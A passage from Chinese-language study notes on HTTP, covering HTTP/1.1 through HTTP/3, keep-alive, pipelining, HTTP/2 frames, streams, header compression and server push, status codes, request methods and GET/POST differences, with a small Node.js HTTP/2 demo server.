- 增加管线化技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟；
- 支持响应分块；
- 引入额外的缓存控制机制；
- 引入内容协商机制，包括语言，编码，类型等，并允许客户端和服务器之间约定以最合适的内容进行交换；
- 感谢`Host`头，**能够使不同域名配置在同一个 IP 地址的服务器上**；

一个典型的请求流程， 所有请求都通过一个连接实现，看起来就像这样：

```http
GET /en-US/docs/Glossary/Simple_header HTTP/1.1
Host: developer.mozilla.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date: Wed, 20 Jul 2016 10:55:30 GMT
Etag: "547fa7e369ef56031dd3bff2ace9fc0832eb251a"
Keep-Alive: timeout=5, max=1000
Last-Modified: Tue, 19 Jul 2016 00:59:33 GMT
Server: Apache
Transfer-Encoding: chunked
Vary: Cookie, Accept-Encoding

(content)
```

```http
GET /static/img/header-background.png HTTP/1.1
Host: developer.cdn.mozilla.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header

HTTP/1.1 200 OK
Age: 9578461
Cache-Control: public, max-age=315360000
Connection: keep-alive
Content-Length: 3077
Content-Type: image/png
Date: Thu, 31 Mar 2016 13:34:46 GMT
Last-Modified: Wed, 21 Oct 2015 18:27:50 GMT
Server: Apache

(image content of 3077 bytes)
```

#### ✔ HTTP 2 - 为了更优异的表现

ref

- [一文读懂 HTTP/2 及 HTTP/3 特性](https://blog.fundebug.com/2019/03/07/understand-http2-and-http3/)

在 2010 年到 2015 年，谷歌通过实践了一个实验性的 SPDY 协议，证明了一个在客户端和服务器端交换数据的另类方式。其收集了浏览器和服务器端的开发者的焦点问题。明确了**响应数量**的增加和**解决复杂的数据传输**，SPDY 成为了 HTTP/2 协议的基础。

HTTP/2 在 HTTP/1.1 有几处基本的不同:

- **二进制传输**：HTTP/2 是**二进制协议**而不是文本协议。**不再可读**，也不可无障碍的手动创建，改善的优化技术现在可被实施；
- **连接复用**：这是一个**复用**协议。**并行的请求能在同一个链接中处理，移除了 HTTP/1.x 中顺序和阻塞的约束**；
- **头部压缩**：压缩了 headers。因为 headers 在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本；
- **服务端推送**：其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求；

#### ✔ HTTP 3

ref

- [一文读懂 HTTP/2 及 HTTP/3 特性](https://blog.fundebug.com/2019/03/07/understand-http2-and-http3/)

HTTP/2 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接。但当这个连接中出现了丢包的情况，那就会导致 HTTP/2 的表现情况反倒不如 HTTP/1 了。

因为在出现丢包的情况下，整个 TCP 都要开始等待重传，也就导致了后面的所有数据都被阻塞了。但是对于 HTTP/1.1 来说，可以开启多个 TCP 连接，出现这种情况反到只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据。

那么可能就会有人考虑到去修改 TCP 协议，其实这已经是一件不可能完成的任务了。因为 TCP 存在的时间实在太长，已经充斥在各种设备中，并且这个协议是由操作系统实现的，更新起来不大现实。

基于这个原因，Google 就更起炉灶搞了一个**基于 UDP 协议的 QUIC 协议**，并且使用在了 HTTP/3 上，HTTP/3 之前名为 HTTP-over-QUIC，从这个名字中我们也可以发现，HTTP/3 最大的改造就是使用了 QUIC。

![QUIC](https://qiniu1.lxfriday.xyz/feoffer/66795018-1c93-70df-7be8-0a39ed68e9df.png)

### ✔ HTTP 长连接 - keep-alive

![](https://qiniu1.lxfriday.xyz/feoffer/03acd99d-1091-8209-bd49-d24f5c8340c5.png)

**HTTP 的长连接和短连接本质上是 TCP 长连接和短连接**。HTTP 属于应用层协议，在传输层使用 TCP 协议，在网络层使用 IP 协议。IP 协议主要解决网络路由和寻址问题，TCP 协议主要解决如何在 IP 层之上可靠的传递数据包，使在网络上的另一端收到发端发出的所有包，并且顺序与发出顺序一致。TCP 有可靠，面向连接的特点。

**什么是长连接、短连接？**

- 短连接：在 HTTP/1.0 中，默认使用的是短连接。也就是说，浏览器和服务器每进行一次 HTTP 操作，就建立一次连接，但任务结束就中断连接；
- 长连接：HTTP/1.1 起，默认使用长连接，用以保持连接特性。使用长连接的 HTTP 协议，会在响应头有加入这行代码：`Connection:keep-alive`；

在使用长连接的情况下，当一个网页打开完成后，**客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接**。**`Keep-Alive` 不会永久保持连接，它有一个保持时间**，可以在不同的服务器软件（如 Apache）中设定这个时间。实现长连接要客户端和服务端都支持长连接。

- 短连接的操作步骤是：建立连接——数据传输——关闭连接...建立连接——数据传输——关闭连接；
- 长连接的操作步骤是：建立连接——数据传输...（保持连接）...数据传输——关闭连接；

---

**Connection**

`Connection` 头（header） 决定当前的事务完成后，是否会关闭网络连接。如果该值是 `keep-alive`，网络连接就是持久的，不会关闭，使得对同一个服务器的请求可以继续在该连接上完成。

```http
Connection: keep-alive
Connection: close
```

`close` 表明客户端或服务器想要关闭该网络连接，这是 HTTP/1.0 请求的默认值；`keep-alive` 表明客户端想要保持该网络连接打开，HTTP/1.1 的请求默认使用一个持久连接。这个请求头列表由头部名组成，这些头将被第一个非透明的代理或者代理间的缓存所移除：这些头定义了发出者和第一个实体之间的连接，而不是和目的地节点间的连接。

**Keep-Alive**

`Keep-Alive` 是一个通用消息头，允许消息发送者暗示连接的状态，还可以用来设置超时时长和最大请求数。

- `timeout`：指定了一个空闲连接**需要保持打开状态的最小时长（以秒为单位）**。需要注意的是，如果没有在传输层设置 keep-alive TCP message 的话，大于 TCP 层面的超时设置会被忽略；
- `max`：在连接关闭之前，在此连接可以发送的最大请求数。在非管道连接中，除了 0 以外，这个值是被忽略的，因为需要在紧跟着的响应中发送新一次的请求。HTTP 管道连接则可以用它来限制管道的使用；

```http
Connection: Keep-Alive
Keep-Alive: timeout=5, max=1000
```

---

**长、短连接的优缺点**

- **长连接**避免多次 TCP 握手。同时存在的连接数不能太多，否则可能会造成资源紧张。长连接中的 HTTP 请求是串行的，存在队头阻塞。数据库的连接用长连接，如果用短连接频繁的通信会造成 socket 错误，而且频繁的 socket 创建也是对资源的浪费；
- **短连接**每次都需要 TCP 握手和挥手，效率并不高；

### ✔ HTTP 管线化技术

ref

- [HTTP 管线化](https://zh.wikipedia.org/wiki/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96)

![](https://qiniu1.lxfriday.xyz/feoffer/d5468337-10b2-3060-745a-b2168f6c7eeb.png)

HTTP 管线化（英语：HTTP pipelining）是将多个 HTTP 请求（request）整批提交的技术，而在发送过程中不需先等待服务器的回应。

请求结果管线化使得 HTML 网页加载时间动态提升，特别是在具体有高延迟的连接环境下，如卫星上网。在宽带连接中，加速不是那么显著的，因为**需要服务端要遵循 HTTP/1.1 协议，必须按照客户端发送的请求顺序来回复请求**，这样整个连接还是**先进先出的，队头阻塞（HOL blocking）可能会发生，造成延迟**。未来的 HTTP/2.0 或者 SPDY 中的异步操作将会解决这个问题。因为它可能将多个 HTTP 请求填充在一个 TCP 数据包内，HTTP 管线化需要在网络上传输较少的 TCP 数据包，减少了网络负载。

### ✔ HTTP 队头阻塞

> 以下内容来自维基：队头阻塞（Head-of-line blocking 或缩写为 HOL blocking）在计算机网络的范畴中是一种性能受限的现象。它的原因是一列的第一个数据包（队头）受阻而导致整列数据包受阻。例如它有可能在缓存式输入的交换机中出现，有可能因为传输顺序错乱而出现，亦有可能在 HTTP 流水线中有多个请求的情况下出现。

HTTP 长连接中我们知道，建立长连击可以避免重复进行 TCP 建立连接和断开连接带来的开销，让同域名下的 HTTP 都走相同的连接。在一个长连接中，可能会发送很多 HTTP 请求，HTTP 队头阻塞就是指长连接中的第一个 HTTP 请求一直阻塞没有返回导致后续 HTTP 请求都被阻塞，这种情况下开启长连接反而会降低性能。

### ✔ HTTP 多路复用

ref

- [浅析 HTTP/2 的多路复用](https://segmentfault.com/a/1190000011172823)

![](https://qiniu1.lxfriday.xyz/feoffer/276119c8-396e-296d-16ce-df21eca15781.png)

在 HTTP/2 中，有两个非常重要的概念，分别是**帧（frame）**和**流（stream）**。帧代表着最小的数据单位，每个帧会标识出该帧属于哪个流。

**多路复用，就是在一个 TCP 连接中可以存在多条流**。换句话说，也就是可以发送多个请求，对端可以通过**帧中的标识知道属于哪个请求**。通过这个技术，可以避免 HTTP 旧版本中的队头阻塞问题，极大地提高传输性能。**流也就是多个帧组成的数据流**。

在 HTTP/2 中，有了二进制分帧之后，HTTP/2 不再依赖 TCP 链接去实现多流并行了，在 HTTP/2 中：

- 同域名下所有通信都在单个连接上完成，同个域名只需要占用一个 TCP 连接，使用一个连接并行发送多个请求和响应；
- **单个连接可以承载任意数量的双向数据流，单个连接上可以并行交错的请求和响应，之间互不干扰**；
- 数据流以消息的形式发送，而消息又由一个或多个帧组成，**多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装**。每个请求都可以带一个 31bit 的优先值，0 表示最高优先级， 数值越大优先级越低；

### ✔ HTTP2 简介

![](https://qiniu1.lxfriday.xyz/feoffer/0f172280-7436-c668-5339-4ab5b64cd790.png)

HTTP/2 必须先发送一个“连接前言”字符串，然后才能建立正式连接。

HTTP/2 全面采用**二进制流**格式传输。这样虽然对人不友好，但却大大方便了计算机的解析。原来使用纯文本的时候容易出现多义性，比如大小写、空白字符、回车换行、多字少字等等，程序在处理时必须用复杂的状态机，效率低，还麻烦。而二进制里只有“0”和“1”，可以严格规定字段大小、顺序、标志位等格式，“对就是对，错就是错”，**解析起来没有歧义**，实现简单，而且**体积小**、**速度快**，做到“内部提效”。

它把 TCP 协议的部分特性挪到了应用层，把原来的“Header+Body”的消息“打散”为数个小片的二进制“帧”（Frame），用**HEADERS**帧存放头数据、**DATA**帧存放实体数据。

HTTP/2 数据分帧后“Header+Body”的报文结构就完全消失了，协议看到的只是一个个的“碎片”。

**h2**表示加密的 HTTP/2，**h2c**表示明文的 HTTP/2，多出的那个字母**c**的意思是**clear text**。

### ✔ HTTP2 数据帧

ref

- [透视 HTTP](https://time.geekbang.org/column/intro/100029001)

HTTP/2 中数据传输的最小单位。头部数据压缩之后，HTTP/2 就要把报文拆成二进制的帧准备发送。

每一帧都包含几个字段，有`length`、`type`、`flags`、`stream identifier`、`frame playload`等，其中 `type` 代表帧的类型，在 HTTP/2 的标准中定义了 10 种不同的类型，包括：

- `HEADERS frame` 头部帧
- `DATA frame` 数据帧
- `PRIORITY` 设置流的优先级
- `RST_STREAM` 终止流
- `SETTINGS` 设置此连接的参数
- `PUSH_PROMISE` 服务器推送
- `PING` 测量 RTT
- `GOAWAY` 终止连接
- `WINDOW_UPDATE` 流量控制
- `CONTINUATION` 继续传输头部数据

**在“流”的层面上看，消息是一些有序的“帧”序列，而在“连接”的层面上看，消息却是乱序收发的“帧”。多个请求 / 响应之间没有了顺序关系，不需要排队等待，也就不会再出现“队头阻塞”问题，降低了延迟，大幅度提高了连接的利用率。**

为了更好地利用连接，加大吞吐量，HTTP/2 还添加了一些控制帧来管理虚拟的“流”，实现了优先级和流量控制，这些特性也和 TCP 协议非常相似。

![](https://qiniu1.lxfriday.xyz/feoffer/1c3120d4-5de5-5488-9466-b4fe337b9692.png)

- 帧开头是 3 个字节的长度（但不包括头的 9 个字节），默认上限是 2^14，最大是 2^24，也就是说 HTTP/2 的帧通常不超过 16K，最大是 16M；
- 长度后面的一个字节是帧类型，大致可以分成数据帧和控制帧两类，HEADERS 帧和 DATA 帧属于数据帧，存放的是 HTTP 报文，而 SETTINGS、PING、PRIORITY 等则是用来管理流的控制帧；
- 第 5 个字节是非常重要的帧标志信息，可以保存 8 个标志位，携带简单的控制信息。常用的标志位有 `END_HEADERS` 表示头数据结束，相当于 HTTP/1 里头后的空行（`\r\n`），`END_STREAM` 表示单方向数据发送结束（即 EOS，End of Stream），相当于 HTTP/1 里 Chunked 分块结束标志（`0\r\n\r\n`）。
- 报文头里最后 4 个字节是流标识符，也就是帧所属的“流”，接收方使用它就可以从乱序的帧里识别出具有相同流 ID 的帧序列，按顺序组装起来就实现了虚拟的“流”；

流标识符虽然有 4 个字节，但最高位被保留不用，所以只有 31 位可以使用，也就是说，流标识符的上限是 2^31，大约是 21 亿。

`PRIORITY` 表示设置了流的优先级，`END_HEADERS` 表示这一个帧就是完整的头数据，`END_STREAM` 表示单方向数据发送结束，后续再不会有数据帧（即请求报文完毕，不会再有 DATA 帧 /Body 数据）。

**在 HTTP/2 连接上，虽然帧是乱序收发的，但只要它们都拥有相同的流 ID，就都属于一个流，而且在这个流里帧不是无序的，而是有着严格的先后顺序**。

### ✔ HTTP2 数据流

流： 存在于连接中的一个虚拟通道。**流可以承载双向消息，每个流都有一个唯一的整数 ID。**

HTTP/2 长连接中的数据包是**不按请求-响应顺序**发送的，一个完整的请求或响应(称一个数据流 stream，每个数据流都有一个独一无二的编号)可能会分成非连续多次发送。它具有如下几个特点：

- 双向性：**同一个流内，可同时发送和接受数据**；
- 并行性：流中的 二进制帧 都是被并行传输的，无需按顺序等待；
- 流的创建：流可以被客户端或服务器单方面建立, 使用或共享；
- 流的关闭：流也可以被任意一方关闭；
- **HEADERS 帧在 DATA 帧前面**；
- 流的 ID 都是奇数，说明是由客户端发起的，这是标准规定的，那么服务端发起的就是偶数了；

HTTP/2 定义了一个“流”（Stream）的概念，它是**二进制帧的双向传输序列，同一个消息往返的帧会分配一个唯一的流 ID**。

在“流”的层面上看，消息是一些有序的“帧”序列，而在“连接”的层面上看，消息却是乱序收发的“帧”。

流是可并发的，一个 HTTP/2 连接上可以同时发出多个流传输数据，也就是并发多请求，实现“多路复用”；

客户端和服务器都可以创建流，双方互不干扰；

流可以设置优先级，让服务器优先处理，比如先传 HTML/CSS，后传图片，优化用户体验；

流之间没有固定关系，彼此独立，但流内部的帧是有严格顺序的；

流 ID 不能重用，只能顺序递增，客户端发起的 ID 是奇数，服务器端发起的 ID 是偶数；

在流上发送 **RST_STREAM** 帧可以随时终止流，取消接收或发送；

第 0 号流比较特殊，不能关闭，也不能发送数据帧，只能发送控制帧，用于流量控制；

当流 ID 用完了的时候可以再发一个控制帧 **GOAWAY**，真正关闭 TCP 连接；

> RST_STREAM 可以取消数据流，而 GOAWAY 断开此次连接。

### ✔ HTTP2 头部压缩

ref

- [HTTP/2 头部压缩技术介绍](https://imququ.com/post/header-compression-in-http2.html)

HTTP/2 并没有使用传统的压缩算法，而是开发了专门的 **HPACK** 算法，在客户端和服务器两端建立“字典”，用索引号表示重复的字符串，还釆用哈夫曼编码来压缩整数和字符串，可以达到 50%~90% 的高压缩率。

**HPACK**算法是专门为压缩 HTTP 头部定制的算法，与 gzip、zlib 等压缩算法不同，它是一个“有状态”的算法，需要客户端和服务器各自维护一份“索引表”，也可以说是“字典”（这有点类似 brotli），压缩和解压缩就是查表和更新表的操作。

HTTP/2 废除了起始行，把起始行里面的请求方法、URI、状态码等统一转换成了头字段的形式，并且给这些“不是头字段的头字段”起了个特别的名字——**伪头字段**（pseudo-header fields）。而起始行里的版本号和错误原因短语因为没什么大用，也给废除了。

为了与**真头字段**区分开来，这些**伪头字段**会在名字前加一个“:”，比如`:authority` `:method` `:status`，分别表示的是域名、请求方法和状态码。

![](https://qiniu1.lxfriday.xyz/feoffer/da05f8c6-2fdf-c0dd-3d95-acf1032f9149.png)

HTTP/2 就为一些最常用的头字段定义了一个只读的**静态表**（Static Table），这个表格列出了**静态表**的一部分，这样只要查表就可以知道字段名和对应的值，
比如数字“2”代表“GET”，数字“8”代表状态码 200。

除了静态表之外还有动态表，它添加在静态表后面，结构相同，但会在编码解码的时候随时更新。

静态字典的作用有两个：1）对于完全匹配的头部键值对，例如 `:method: GET`，可以直接使用一个字符表示；2）对于头部名称可以匹配的键值对，例如 `cookie: xxxxxxx`，可以将名称使用一个字符表示。HTTP/2 中的静态字典如下（以下只截取了部分，完整表格在[这里](https://httpwg.github.io/specs/rfc7541.html#static.table.definition)）：

![](https://qiniu1.lxfriday.xyz/feoffer/ab636114-5355-0a7a-3917-34c9d58ce214.png)

浏览器可以告知服务端，将 `cookie: xxxxxxx` 添加到动态字典中，这样后续整个键值对就可以使用一个字符表示了。类似的，服务端也可以更新对方的动态字典。需要注意的是，动态字典上下文有关，需要为每个 HTTP/2 连接维护不同的字典。

**HTTP/2 中所有头部名称必须小写。**

> 在进行 HTTP/2 网站性能优化时很重要一点是「使用尽可能少的连接数」，头部压缩是其中一个很重要的原因：同一个连接上产生的请求和响应越多，动态字典积累得越全，头部压缩效果也就越好（字典基于连接，在不同的连接中字典不一致）。所以，针对 HTTP/2 网站，最佳实践是不要合并资源，不要散列域名。

默认情况下，浏览器会针对这些情况使用同一个连接：

- 同一域名下的资源；
- 不同域名下的资源，但是满足两个条件：1）解析到同一个 IP；2）使用同一个证书；

使用多域名加上相同的 IP 和证书部署 Web 服务有特殊的意义：让支持 HTTP/2 的终端只建立一个连接，用上 HTTP/2 协议带来的各种好处；而只支持 HTTP/1.1 的终端则会建立多个连接，达到同时更多并发请求的目的。这在 HTTP/2 完全普及前也是一个不错的选择。

### ✔ HTTP2 服务端推送

ref

- [阮一峰：HTTP/2 服务器推送（Server Push）教程](http://www.ruanyifeng.com/blog/2018/03/http2_server_push.html)

![](https://qiniu1.lxfriday.xyz/feoffer/e4c9e805-3202-9b57-e7ed-8399afd77cd3.png)

HTTP/2 在一定程度上改变了传统的“请求 - 应答”工作模式，服务器不再是完全被动地响应请求，也可以新建“流”主动向客户端发送消息。比如，在浏览器刚请求 HTML 的时候就提前把可能会用到的 JS、CSS 文件发给客户端，减少等待的延迟，这被称为“服务器推送”（Server Push，也叫 Cache Push）。

### ✔ HTTP2 本地搭建

先用 openssl 生成公钥、私钥和证书：

```bash
openssl req -newkey rsa:2048 -new -nodes -keyout key.pem -out csr.pem
openssl x509 -req -days 365 -in csr.pem -signkey key.pem -out server.crt
```

生成三个文件：`key.pem` 私钥，`csr.pem` 公钥，`server.crt` 服务端证书；

下面用 nodejs 搭建一个 server：

```javascript
const http2 = require('http2')
const fs = require('fs')

const server = http2.createSecureServer({
  key: fs.readFileSync('./key.pem'),
  cert: fs.readFileSync('./server.crt'),
})
server.on('error', err => console.error(err))

server.on('stream', (stream, headers) => {
  // 流是一个双工流。
  stream.respond({
    'content-type': 'text/html',
    ':status': 200,
  })
  console.log('stream', stream)
  console.log('headers', headers)

  stream.end(
    fs
      .readFileSync('./index.html')
      .toString()
      .replace(
        '$headers$',
        Object.keys(headers)
          .map(header => `<li>${header}:${headers[header]}</li>`)
          .join('')
      )
  )
})

server.listen(8443)
console.log('http2 listening at 8443')
```

index.html

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>https&&http2</title>
  </head>
  <body>
    hello http2
    <br />
    <p>headers</p>
    <ul>
      $headers$
    </ul>
  </body>
</html>
```

最后的效果

![](https://qiniu1.lxfriday.xyz/feoffer/26f1c080-08b5-c9f6-0965-7ab63a382fdf.png)

### ✔ HTTP1、HTTPS、HTTP2 协议构成

![](https://qiniu1.lxfriday.xyz/feoffer/940189e4-6510-2854-9807-36366ddda4bf.png)

### ✔ http 状态码

#### ✔ 100 Continue

表示目前为止一切正常, 客户端应该继续请求, 如果已完成请求则忽略。

POST 请求实际会发送两个包，第一个包发出去之后服务端会返回 100。可以查看【 GET、POST 区别】部分了解更多。

#### ✔ 101 Switching Protocols

ref

- [https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism)

![](https://qiniu1.lxfriday.xyz/feoffer/http-response-code-101.png)

（协议切换）状态码表示服务器应客户端升级协议的请求（Upgrade 请求头）正在进行协议切换。

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
```

协议升级请求总是由客户端发起的；当客户端试图升级到一个新的协议时，可以先发送一个普通的请求（GET，POST 等），不过这个请求需要进行特殊配置以包含升级请求。

- `Connection: Upgrade`，设置 `Connection` 头的值为 `Upgrade` 来指示这是一个升级请求；
- `Upgrade: protocols`，`Upgrade` 头指定一项或多项协议名，按优先级排序，以逗号分隔；

#### ✔ 200 OK

表明请求已经成功。

PUT 和 DELETE 的请求成功通常并不是响应 200 OK 的状态码而是 204 No Content 表示无内容(或者 201 Created 表示一个资源首次被创建成功)。

#### ✔ 201 Created

表示请求已经被成功处理，并且创建了新的资源。新的资源在应答返回之前已经被创建。同时新增的资源会在应答消息体中返回，其地址或者是原始请求的路径，或者是 Location 首部的值。

**这个状态码的常规使用场景是作为 POST 请求的返回值。**

#### ✔ 202 Accepted

表示服务器端已经收到请求消息，但是尚未进行处理。

这个状态码被设计用来将请求交由另外一个进程或者服务器来进行处理，或者是对请求进行批处理的情形。

#### ✔ 204 No Content

表示该请求已经成功了，但是客户端不需要离开当前页面。

使用惯例是，**在 PUT 请求中进行资源更新，但是不需要改变当前展示给用户的页面，那么返回 204 No Content**。如果创建了资源，则返回 201 Created 。如果应将页面更改为新更新的页面，则应改用 200 。

#### ✔ 206 Partial Content

表示请求已成功，**并且主体包含所请求的数据区间，该数据区间是在请求的 `Range` 首部指定的**。

如果只包含一个数据区间，那么整个响应的 `Content-Type` 首部的值为所请求的文件的类型，同时包含 `Content-Range` 首部。

如果包含多个数据区间，那么整个响应的 `Content-Type` 首部的值为 `multipart/byteranges` ，其中一个片段对应一个数据区间，并提供 `Content-Range` 和 `Content-Type` 描述信息。

只包含一个数据区间的响应：

```http
HTTP/1.1 206 Partial Content
Date: Wed, 15 Nov 2015 06:25:24 GMT
Last-Modified: Wed, 15 Nov 2015 04:58:08 GMT
Content-Range: bytes 21010-47021/47022
Content-Length: 26012
Content-Type: image/gif

... 26012 bytes of partial image data ...
```

包含多个数据区间的响应：

```http
HTTP/1.1 206 Partial Content
Date: Wed, 15 Nov 2015 06:25:24 GMT
Last-Modified: Wed, 15 Nov 2015 04:58:08 GMT
Content-Length: 1741
Content-Type: multipart/byteranges; boundary=String_separator

--String_separator
Content-Type: application/pdf
Content-Range: bytes 234-639/8000

...the first range...
--String_separator
Content-Type: application/pdf
Content-Range: bytes 4590-7999/8000

...the second range
--String_separator--
```

网易云音乐举例：

请求头中会有 Range

```http
Range: bytes=0-
// Range: bytes=10682368-23317920
```

返回头中：

```http
Content-Range: bytes 0-2925871/2925872
Content-Length: 2925872
```

#### ✔ 301 Moved Permanently

HTTP 301 永久重定向，说明请求的资源已经被移动到了由 `Location` 头部指定的 `URL` 上，是固定的不会再改变。搜索引擎会根据该响应修正。

尽管标准要求浏览器在收到该响应并进行重定向时不应该修改 http method 和 body，但是有一些浏览器可能会有问题。所以最好是在应对 GET 或 HEAD 方法时使用 301，其他情况使用 308 来替代 301。

#### ✔ 302 Move Temporarily(Found)

HTTP 302 Found 重定向状态码表明请求的资源被暂时的移动到了由 `Location` 头部指定的 `URL` 上。浏览器会重定向到这个 `URL`， 但是搜索引擎不会对该资源的链接进行更新。

#### ✔ 303 See Other

ref

- [https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections)

HTTP 303 See Other 重定向状态码，通常作为 PUT 或 POST 操作的返回结果，它表示重定向链接指向的不是新上传的资源，而是另外一个页面，比如消息确认页面或上传进度页面。

**明确指定浏览器应该使用 GET 方法请求重定向的页面**。

#### ✔ 304 Not Modified

表示可以使用本地缓存的内容，详见【HTTP 缓存】部分。

#### ✔ 307 Temporary Redirect

307 Temporary Redirect（临时重定向）是表示重定向的响应状态码，说明请求的资源暂时地被移动到 `Location` 首部所指向的 `URL` 上。

307 状态码可以确保请求方法和消息主体不会发生变化（303 是让浏览器用 GET）。

#### ✔ 308 Permanent Redirect

表示重定向的响应状态码，说明请求的资源已经被永久的移动到了由 `Location` 首部指定的 `URL` 上。浏览器会进行重定向，同时搜索引擎也会更新其链接。

**在重定向过程中，请求方法和消息主体不会发生改变，然而在返回 301 状态码的情况下，请求方法有时候会被客户端错误地修改为 GET 方法**。

#### ✔ 400 Bad Request

表示由于语法无效，服务器无法理解该请求。 客户端不应该在未经修改的情况下重复此请求。

#### ✔ 401 Unauthorized

代表客户端错误，指的是由于缺乏目标资源要求的**身份验证凭证**，发送的请求未得到满足。这个状态码会与 `WWW-Authenticate` 首部一起发送，其中包含有如何进行验证的信息。

```http
HTTP/1.1 401 Unauthorized
Date: Wed, 21 Oct 2015 07:28:00 GMT
WWW-Authenticate: Basic realm="Access to staging site"
```

不知道你是谁，所以不让你请求。

#### ✔ 403 Forbidden

代表客户端错误，指的是服务器端有能力处理该请求，但是拒绝授权访问。

知道你是谁但是不让你请求。

#### ✔ 404 Not Found

代表客户端错误，指的是服务器端无法找到所请求的资源。

#### ✔ 405 Method Not Allowed

表明服务器禁止了使用当前 HTTP 方法的请求。需要注意的是，GET 与 HEAD 两个方法不得被禁止，当然也不得返回状态码 405。

#### ✔ 500 Internal Server Error

表示服务器端错误的响应状态码，意味着所请求的服务器遇到意外的情况并阻止其执行请求。

#### ✔ 501 Not Implemented

**客户端发起的请求超出服务器的能力范围(比如，使用了服务器不支持的请求方法)时，使用此状态码**。

表示请求的方法不被服务器支持，因此无法被处理。服务器必须支持的方法（即不会返回这个状态码的方法）只有 GET 和 HEAD。

请注意，你无法修复 501 错误，需要被访问的 web 服务器去修复该问题。

405 是明确禁止使用某种方法访问，501 是服务器还不支持（后续可能会支持）。

#### ✔ 502 Bad Gateway

表示作为网关或代理角色的服务器，从上游服务器（如 tomcat、php-fpm）中接收到的响应是无效的。代理使用的服务器遇到了上游的无效响应。

#### ✔ 503 Service Unavailable

表示服务器尚未处于可以接受请求的状态。造成这种情况的原因是由**于服务器停机维护或者已超载**。

#### ✔ 504 Gateway Timeout

表示扮演网关或者代理的服务器无法在规定的时间内获得想要的响应。响应来自网关或代理，此网关或代理在等待另一台服务器的响应时出现了超时。

### ✔ http 请求方法

#### ✔ GET

获取资源。

#### ✔ HEAD

用于获取报文头，返回的响应中没有具体的内容。

HEAD 方法的响应不应包含响应正文，即使包含了正文也必须忽略掉。

#### ✔ POST

提交数据给服务端，数据可能是表单、文件、字符串等。

数据被包含在请求体中，POST 可能会导致新资源的建立或者已有的资源的更改。

#### ✔ PUT

客户端提交数据给服务端，以更改服务端的数据。

**PUT 是幂等的，POST 是非幂等，POST 重复提交会导致数据不断增加，而 PUT 只是用新值替换老的值**。

> 幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。

#### ✔ DELETE

请求服务器删除指定的资源。

#### ✔ OPTIONS

查询指定 URL 支持的能力。

> 在 CORS 跨域方案中，浏览器会先发送一个 OPTIONS 请求（预检请求），服务端会返回支持的 HTTP 方法、允许的 origin、是否允许提交 cookie 等信息。

![OPTIONS 请求过程](https://qiniu1.lxfriday.xyz/feoffer/options.png)

#### ✔ CONNECT

要求在与代理服务器通信时建立隧道。

使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。

#### ✔ TRACE

做路径追踪。

发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。

### ✔ GET、POST 区别

ref

- [https://www.cnblogs.com/logsharing/p/8448446.html](https://www.cnblogs.com/logsharing/p/8448446.html)

1. GET 通过 url 传递参数，POST 可以通过 url 和 request body 传递参数；
1. GET 请求可以缓存，POST 请求不能缓存（cache-control 经测试无法缓存）；
1. GET 只能进行 url 编码，POST 传输的编码方式很多；
1. GET 请求参数会保存在浏览器历史中，POST 不会；
1. GET 传递的参数上限是 2k，POST 没有限制；
1. GET 只接受 ASCII 字符，POST 没有限制；
1. **GET 产生一个 TCP 数据包，POST 产生两个 TCP 数据包；**

> 对于 GET 方式的请求，浏览器会把 http header 和 data 一并发送出去，服务器响应 200（返回数据）；而对于 POST，浏览器先发送 header，服务器响应 100 continue，浏览器再发送 data，服务器响应 200 ok（返回数据）。另外并不是所有浏览器都会在 POST 中发送两次包，Firefox 就只发送一次。

本质上 GET、POST 都是基于 HTTP 的，他们的报文传输格式并没有本质区别，下面是 GET 和 POST 原始传输的内容，**GET 其实也可以在 request body 中放数据，只是大部分处理程序会直接忽略**。

> 业界不成文的规定是，（大多数）浏览器通常都会限制 url 长度在 2K 个字节，而（大多数）服务器最多处理 64K 大小的 url。数据量太大会对处理程序造成负担。

- 【GET 请求】

![http-get](https://qiniu1.lxfriday.xyz/feoffer/http-get.png)

- 【POST 请求(multipart/form-data)】

![http-post](https://qiniu1.lxfriday.xyz/feoffer/http-post.png)

- 【POST 请求(application/json)】

![http-post](https://qiniu1.lxfriday.xyz/feoffer/http-post2.png)

- 【POST 请求(application/x-www-form-urlencoded)】

![http-post](https://qiniu1.lxfriday.xyz/feoffer/http-post3.png)

### ✔ Cookie

#### ✔ Cookie 是什么

![cookie](https://qiniu1.lxfriday.xyz/feoffer/07ca8977-d2ab-480e-fc56-bd5704f27d1c.png)

